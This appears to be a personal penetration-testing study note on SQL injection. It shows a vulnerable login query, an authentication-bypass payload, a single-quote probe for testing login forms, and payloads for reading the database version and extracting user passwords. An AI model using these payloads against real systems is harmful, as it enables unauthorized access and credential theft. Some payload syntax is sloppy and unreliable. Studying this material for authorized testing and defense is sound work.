---
title: SQL Injection
updated: 2025-04-22 11:14:14Z
created: 2025-04-21 02:06:05Z
latitude: 11.54487290
longitude: 104.89216680
altitude: 0.0000
---

## Common SQL string formats:
`"SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`

* * *
**Authentication Bypass**
Force the closing quote on the value, adding and **OR 1=1** statement and terminating the SQL statement
`offsec' OR 1=1 -- //`
so ``"SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`` becomes:

`SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`

**How to test:**
1. On a Username/Password Login screen, try entering the following usernames:
**'**
**offssec'**

## ***If you get an error, you are interfacing with the SQL server!***

* * *
## Exploits
**Show SQL version:**
`' OR 1=1 IN (SELECT @@version) --//****`

**Extract users / passwords:**
`' OR 1=1 IN (SELECT * FROM users) -- //`
`' OR 1=1 IN (SELECT password FROM users) -- //`
`' OR 1=1 IN (SELECT password FROM users WHERE username = 'admin') -- //`  

